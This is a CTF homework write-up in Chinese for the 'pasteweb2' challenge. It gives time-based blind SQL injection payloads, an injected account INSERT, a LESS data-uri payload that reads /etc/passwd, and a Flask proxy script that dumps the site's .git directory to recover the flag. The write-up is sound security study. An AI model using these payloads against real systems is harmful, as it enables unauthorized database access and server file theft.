# hw_pasteweb2

1. 這題延續上一題，先爆出了 column 欄位 “user_id”、”user_account”、“user_password”。

```python
payload = f"select case when substring(column_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.columns where table_name='s3cr3t_t4b1e'  ;"
```

用這段 payload 可以爆出 admin 的字串

```python
payload = f" select case when substring(user_account,{i},1)='{j}' then pg_sleep(1.5) else pg_sleep(0) end from pasteweb_accounts limit 1"
```

然後用這段 payload 爆出 password 的密碼，但發現是 hash ，所以用線上的 crash 去破解後，得到 ”P@ssw0rD“

```python
payload = f" select case when substring(user_password,{i},1)='{j}' then pg_sleep(1.5) else pg_sleep(0) end from pasteweb_accounts limit 1"
```

![截圖 2022-12-27 下午9.32.43.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-27_%25E4%25B8%258B%25E5%258D%25889.32.43.png)

然後就利用這組 admin 帳號密碼，就可以成功登入。

![截圖 2022-12-27 下午9.38.33.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-27_%25E4%25B8%258B%25E5%258D%25889.38.33.png)

然後因為提示有說要幫自己註冊一個帳號密碼，免得會跟人共用不知道什麼 paylaod 的內容，於是想辦法用 SQL injection 去 insert 一個 row，就是加一組帳號進去，payload 如下。

```sql
insert into pasteweb_accounts (user_id, user_account, user_password) values ( "100","hacker01","16d7a4fca7442dda3ad93c9a726597e4")
```

1. 登入後發現有 Edit HTML、Edit CSS 、View、Share 幾個選項，先嘗試在 HTML隨意嘗試 XSS payload ，但好像什麼事情也沒發生，但我點到 view 後，發現XSS Script 有成功，猜測這邊是可以利用 Edit HTML 及 Edit CSS 可以去執行 XSS Script，然後從 View 可以看到 XSS Script 的攻擊結果。

![截圖 2022-12-28 下午3.13.37.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-28_%25E4%25B8%258B%25E5%258D%25883.13.37.png)

![截圖 2022-12-28 下午3.14.26.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-28_%25E4%25B8%258B%25E5%258D%25883.14.26.png)

1. 然後發現可以 Edit HTL、Edit CSS、，期中 Edit CSS 可以 Support LESS，研究了一下LESS是一兼容兼容的的語言，可以通過編譯器轉換成合適的CSS語言法，提供給瀏覽器進行渲染。然後我這邊參考網路使用 LESS 的 data-url 去 XSS Script 的一些範例，於是嘗試使用下面這一段 payload 去執行 uri-data 去讀取資料，然後成功返回 base64 的一段 code ，用 online tool 解碼後，成功解出 /etc/passwd 的內容。

```css
.test {
  content: data-uri('/etc/passwd');
}
```

![截圖 2022-12-28 下午3.18.58.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-28_%25E4%25B8%258B%25E5%258D%25883.18.58.png)

![截圖 2022-12-28 下午3.19.53.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-28_%25E4%25B8%258B%25E5%258D%25883.19.53.png)

1. 接下來卡關很久，因為讀取了很多 file 裡面的內容，但看起來都跟解題沒關係，直到我找在這個路徑 “/var/www/html/.git” 找到 ./git 的 file，而且隨意讀取了 .git/config ，這代表這邊是有機會 git leak 的，但是讀取完資料夾後，發現沒有辦法每個檔案都讀取到，因為不知道每一個檔案的名稱。

![截圖 2022-12-28 下午11.27.56.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-28_%25E4%25B8%258B%25E5%258D%258811.27.56.png)

![截圖 2022-12-28 下午11.27.22.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-28_%25E4%25B8%258B%25E5%258D%258811.27.22.png)

1. 接下來參考了很多網路資料跟人家解類似題目的方法，這邊我得到一個想法，就是用使用 git tool 去載 git 檔案，然後用自己寫一個 server 去把 git tool 的 request 轉為 payload ，server 再把 paylaod 送到 web 去，然後再去讀取 web view 裡面的網頁原始碼，再把裡面的資訊轉悚給 git tool ，有點像是寫一個 server 當成 web 跟 git tool 的 proxy 。

以下是我的 code。

```python
from flask import Flask
import base64
import requests
import json

app = Flask(__name__)
cookies = { 'PHPSESSID' : 'j6h2hkmmmts4uao04u107i25lh' }

@app.route('/<path:path>')
def catch_all(path):
    editCSS(path)
    file_info = view()
    return file_info

def editCSS(path):
    #edit CSS
    url_edit = 'https://pasteweb.ctf.zoolab.org/editcss.php'
    value = { 'less' : "test {content: data-uri('/var/www/html/"+path+"');}"}
    print(f"[*] Update value :  {value}")
    print(f"[*] Check  path  :  {path} ")
    r = requests.post(url_edit, data=value, cookies=cookies)  

def view():
    #read file information - view.php
    url_view = 'https://pasteweb.ctf.zoolab.org/view.php'
    r = requests.get(url_view, cookies=cookies)  
    response = r.content.decode('utf-8')
    string_start = response.find(';base64,')
    string_end = response.find('");\n')
    info = response[string_start+8:string_end]
    print(f"[*] Origin Value :  {info}")
    print(f"[*] Return Value : ",base64.b64decode(info) )

    return base64.b64decode(info)

if __name__ == '__main__':
    app.run()
```

1. 寫完後就直接後把 flask 架起來。然後我使用 git 工具 scramble ，嘗試去 request flask server，但不知道為什麼會有下面這個問題，於是我開始去 debug ，發現第一個 scramble 的 request 要去讀 .git/HEAD ，flask 可以成功要到資料並回傳byte 資料  b'ref: refs/heads/master\n' 給 scrammble ，第二個 scramble 的 request 要去讀 .git/refs/heads/master ，flask 也可以成功要到資料並回傳 byte b'f7fac4b9675f72b3333c732e7ed5a0066d78599d\n' 給 scramble 然後scramble 會有下面這個 error。研究了一下才知道原來是 mac 沒有裝 wget …，所以 git tool 沒有辦法透過 wget 接續去下載資料，以後會先檢查工具可以不可以正常運行，再來嘗試跑 paylaod 的檔案。

```python
fatal: Not a valid object name f7fac4b9675f72b3333c732e7ed5a0066d78599d
./scrabble: line 64: .git/refs/heads/master: No such file or directory
fatal: not a git repository (or any of the parent directories): .git
```

1. 最後 brew install wget 之後， git tool 就可以成功取得所有 source code，然後這邊我直接 
cat index.php | grep “FLAG*” 就成功取得 FLAG。

![截圖 2022-12-28 下午11.00.20.png](hw_pasteweb2%20ec3c3bb2105141639ae45aa6057579b7/%25E6%2588%25AA%25E5%259C%2596_2022-12-28_%25E4%25B8%258B%25E5%258D%258811.00.20.png)

參考資料

1. 爬蟲的一些解釋 : [https://www.cnblogs.com/wyy1480/p/11516693.html](https://www.cnblogs.com/wyy1480/p/11516693.html)
2. git leak 教學 : [https://ithelp.ithome.com.tw/articles/10265467?sc=pt](https://ithelp.ithome.com.tw/articles/10265467?sc=pt)
3. data-url 使用範例[https://www.ctfiot.com/53040.html](https://www.ctfiot.com/53040.html)